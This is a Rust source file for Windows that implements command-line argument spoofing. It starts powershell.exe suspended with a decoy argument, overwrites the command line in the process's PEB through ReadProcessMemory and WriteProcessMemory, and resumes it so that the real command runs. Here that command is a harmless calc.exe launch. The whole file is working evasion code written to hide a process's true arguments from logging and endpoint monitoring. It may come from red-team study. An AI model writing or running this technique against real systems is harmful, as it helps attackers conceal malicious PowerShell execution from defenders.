mod peb_structs;

use std::{
    ffi::OsStr,
    os::windows::ffi::OsStrExt,
    ptr::{null, null_mut},
};

use peb_structs::{PEB, PROCESS_BASIC_INFORMATION, RTL_USER_PROCESS_PARAMETERS, ProcessImageFileName};

use winapi::um::winnt::HANDLE;
use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::{DWORD, ULONG},
        ntdef::{NTSTATUS, PVOID},
    },
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
        libloaderapi::{GetModuleHandleW, GetProcAddress},
        memoryapi::{ReadProcessMemory, WriteProcessMemory},
        processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW},
        winbase::{CREATE_NO_WINDOW, CREATE_SUSPENDED},
    },
};

const STARTUP_ARGUMENTS: &str = "powershell.exe Totally Legit Argument";
const REAL_EXECUTED_ARGUMENTS: &str = "powershell.exe -c calc.exe";

type NtQueryInformationProcess =
unsafe extern "system" fn(*mut c_void, i32, PVOID, ULONG, *mut ULONG) -> NTSTATUS;

fn wstr(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
use winapi::shared::minwindef::FALSE;

fn get_process_image_name(
    nt_query: NtQueryInformationProcess,
    pid: DWORD,   // ← take PID instead of handle
) -> Option<String> {
    unsafe {
        // open fresh handle with exact access class 26 needs
        let h_process = OpenProcess(
            PROCESS_QUERY_INFORMATION,
            FALSE,
            pid
        );

        if h_process.is_null() {
            println!("[!] OpenProcess failed: {}", GetLastError());
            return None;
        }

        let mut return_len: ULONG = 0;
        let buffer_size = 2048usize;  // larger buffer

        let buffer = HeapAlloc(
            GetProcessHeap(),
            0,
            buffer_size
        ) as *mut u8;

        if buffer.is_null() {
            CloseHandle(h_process);
            return None;
        }

        let status = nt_query(
            h_process,
            27,
            buffer as PVOID,
            buffer_size as ULONG,
            &mut return_len,
        );

        println!("[i] Status: {:#x} ReturnLen: {}", status, return_len);

        if status != 0 {
            println!("[!] NtQueryInformationProcess [26] failed: {:#x}", status);
            HeapFree(GetProcessHeap(), 0, buffer as *mut _);
            CloseHandle(h_process);
            return None;
        }

        let uni_str = &*(buffer as *const winapi::shared::ntdef::UNICODE_STRING);
        let len = uni_str.Length as usize / 2;

        if uni_str.Buffer.is_null() || len == 0 {
            HeapFree(GetProcessHeap(), 0, buffer as *mut _);
            CloseHandle(h_process);
            return None;
        }

        let wide = std::slice::from_raw_parts(uni_str.Buffer, len);
        let result = String::from_utf16_lossy(wide);

        HeapFree(GetProcessHeap(), 0, buffer as *mut _);
        CloseHandle(h_process);
        Some(result)
    }
}

unsafe fn create_arg_spoofed_process(
    startup_args: &str,
    real_args: &str,
    dw_process_id: &mut DWORD,
    h_process: &mut HANDLE,
    h_thread: &mut HANDLE,
) -> Result<(), String> {
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as DWORD;

        let ntdll = GetModuleHandleW(wstr("NTDLL").as_ptr());
        let nt_query_info =
            GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr() as *const i8);

        if nt_query_info.is_null() {
            return Err("Failed to get NtQueryInformationProcess address".to_string());
        }
        let nt_query_info: NtQueryInformationProcess = std::mem::transmute(nt_query_info);

        let mut process_path = wstr(startup_args);
        println!("\t[i] Running : \"{}\" ... ", startup_args);

        let create_process = CreateProcessW(
            null(),
            process_path.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            null_mut(),
            wstr("C:\\Windows\\System32\\").as_ptr(),
            &mut si,
            &mut pi,
        );

        if create_process == 0 {
            return Err(format!(
                "CreateProcessW Failed with Error: {}",
                GetLastError()
            ));
        }
        println!("[+] DONE");
        println!("\t[i] Target Process Created With Pid : {}", pi.dwProcessId);

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let mut return_len: ULONG = 0;
        let status = nt_query_info(
            pi.hProcess,
            0,
            &mut pbi as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut return_len,
        );
        if status != 0 {
            return Err(format!(
                "NtQueryInformationProcess Failed With Error: 0x{:08X}",
                status
            ));
        }


        let peb_size = std::mem::size_of::<PEB>();
        let mut peb_bytes_read: usize = 0;
        let peb_buffer = HeapAlloc(GetProcessHeap(), 0, peb_size) as *mut PEB;

        if ReadProcessMemory(
            pi.hProcess,
            pbi.PebBaseAddress as *const _,
            peb_buffer as *mut _,
            peb_size,
            &mut peb_bytes_read,
        ) == 0
            || peb_bytes_read != peb_size
        {
            HeapFree(GetProcessHeap(), 0, peb_buffer as *mut _);
            return Err(format!(
                "Failed To Read Target's Process PEB: {}",
                GetLastError()
            ));
        }

        let peb = &*peb_buffer;

        let params_size = std::mem::size_of::<RTL_USER_PROCESS_PARAMETERS>() + 0xFF;
        let mut params_bytes_read: usize = 0;

        let params_buffer =
            HeapAlloc(GetProcessHeap(), 0, params_size) as *mut RTL_USER_PROCESS_PARAMETERS;

        let read_process_memory = ReadProcessMemory(
            pi.hProcess,
            peb.ProcessParameters as *const _,
            params_buffer as *mut _,
            params_size,
            &mut params_bytes_read,
        );

        if read_process_memory == 0 || params_bytes_read != params_size {
            HeapFree(GetProcessHeap(), 0, peb_buffer as *mut _);
            HeapFree(GetProcessHeap(), 0, params_buffer as *mut _);
            return Err(format!(
                "Failed To Read ProcessParameters: {}",
                GetLastError()
            ));
        }
        let params = &*params_buffer;

        let real_args_w = wstr(real_args);
        let buffer_size = real_args_w.len() * std::mem::size_of::<u16>();
        let mut bytes_written: usize = 0;

        println!(
            "\t[i] Writing \"{}\" As The Process Argument At : {:p} ... ",
            real_args, params.CommandLine.Buffer
        );

        let write_process_mem = WriteProcessMemory(
            pi.hProcess,
            params.CommandLine.Buffer as *mut _,
            real_args_w.as_ptr() as *const _,
            buffer_size,
            &mut bytes_written,
        );

        if write_process_mem == 0 || bytes_written != buffer_size {
            HeapFree(GetProcessHeap(), 0, peb_buffer as *mut _);
            HeapFree(GetProcessHeap(), 0, params_buffer as *mut _);
            return Err(format!(
                "Failed To Write Real Parameters: {}",
                GetLastError()
            ));
        }
        println!("[+] DONE");

        HeapFree(GetProcessHeap(), 0, peb_buffer as *mut _);
        HeapFree(GetProcessHeap(), 0, params_buffer as *mut _);

        println!("\n[i] Querying ProcessImageFileName...");
        match get_process_image_name(nt_query_info, pi.dwProcessId) {
            Some(name) => println!("[+] Image path: {}", name),
            None       => println!("[!] Failed to get image name"),
        }

        ResumeThread(pi.hThread);




        *dw_process_id = pi.dwProcessId;
        *h_process = pi.hProcess;
        *h_thread = pi.hThread;



        if *dw_process_id != 0 && !h_process.is_null() && !h_thread.is_null() {
            Ok(())
        } else {
            Err("Invalid process information".to_string())
        }
    }
}

fn main() {
    unsafe {
        println!(
            "[i] Target Process Will Be Created With [Startup Arguments] {:?}",
            STARTUP_ARGUMENTS
        );

        println!(
            "[i] The Actual Arguments [Payload Argument] {:?}",
            REAL_EXECUTED_ARGUMENTS
        );

        let mut pid = 0;
        let mut h_process: HANDLE = null_mut();
        let mut h_thread: HANDLE = null_mut();

        match create_arg_spoofed_process(
            STARTUP_ARGUMENTS,
            REAL_EXECUTED_ARGUMENTS,
            &mut pid,
            &mut h_process,
            &mut h_thread,
        ) {
            Ok(()) => println!("Process created successfully"),
            Err(e) => println!("Error: {}", e),
        }

        println!("\n[#] Press <Enter> To Quit ... ");

        let _ = std::io::stdin().read_line(&mut String::new());

        CloseHandle(h_process);
        CloseHandle(h_thread);
    }
}
